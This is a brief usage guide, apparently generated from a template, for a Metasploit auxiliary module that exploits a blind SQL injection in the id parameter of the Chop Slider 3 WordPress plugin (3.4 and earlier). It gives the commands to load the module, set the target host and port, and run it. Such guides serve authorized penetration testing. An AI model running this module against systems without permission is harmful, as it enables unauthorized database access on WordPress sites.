**The description of current metasploit exploit**
The iDangero.us Chop Slider 3 WordPress plugin version 3.4 and prior          contains a blind SQL injection in the id parameter of the          get_script/index.php page.  The injection is passed through GET          parameters, and thus must be encoded,          and magic_quotes is applied at the server.

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/wp_chopslider_id_sqli
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 80 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.